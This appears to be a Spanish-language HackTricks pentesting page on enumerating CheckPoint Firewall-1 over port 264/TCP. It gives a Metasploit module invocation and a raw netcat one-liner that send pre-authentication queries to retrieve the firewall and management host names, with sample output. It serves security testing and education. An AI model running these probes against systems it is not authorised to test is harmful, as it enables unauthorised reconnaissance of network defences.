{{#include ../banners/hacktricks-training.md}}

Es posible interactuar con los firewalls de **CheckPoint** **Firewall-1** para descubrir información valiosa, como el nombre del firewall y el nombre de la estación de gestión. Esto se puede hacer enviando una consulta al puerto **264/TCP**.

### Obtención de Nombres de Firewall y Estación de Gestión

Utilizando una solicitud de pre-autenticación, puedes ejecutar un módulo que apunte al **CheckPoint Firewall-1**. Los comandos necesarios para esta operación se describen a continuación:
```bash
use auxiliary/gather/checkpoint_hostname
set RHOST 10.10.10.10
```
Al ejecutarse, el módulo intenta contactar el servicio de Topología SecuRemote del firewall. Si tiene éxito, confirma la presencia de un CheckPoint Firewall y recupera los nombres tanto del firewall como del host de gestión SmartCenter. Aquí hay un ejemplo de cómo podría verse la salida:
```text
[*] Attempting to contact Checkpoint FW1 SecuRemote Topology service...
[+] Appears to be a CheckPoint Firewall...
[+] Firewall Host: FIREFIGHTER-SEC
[+] SmartCenter Host: FIREFIGHTER-MGMT.example.com
[*] Auxiliary module execution completed
```
### Método Alternativo para el Descubrimiento de Nombre de Host y Nombre ICA

Otra técnica implica un comando directo que envía una consulta específica al firewall y analiza la respuesta para extraer el nombre de host del firewall y el nombre ICA. El comando y su estructura son los siguientes:
```bash
printf '\x51\x00\x00\x00\x00\x00\x00\x21\x00\x00\x00\x0bsecuremote\x00' | nc -q 1 10.10.10.10 264 | grep -a CN | cut -c 2-
```
La salida de este comando proporciona información detallada sobre el nombre del certificado del firewall (CN) y la organización (O), como se demuestra a continuación:
```text
CN=Panama,O=MGMTT.srv.rxfrmi
```
## Referencias

- [https://supportcenter.checkpoint.com/supportcenter/portal?eventSubmit_doGoviewsolutiondetails=&solutionid=sk69360](https://supportcenter.checkpoint.com/supportcenter/portal?eventSubmit_doGoviewsolutiondetails=&solutionid=sk69360)
- [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html\#check-point-firewall-1-topology-port-264](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html#check-point-firewall-1-topology-port-264)

{{#include ../banners/hacktricks-training.md}}
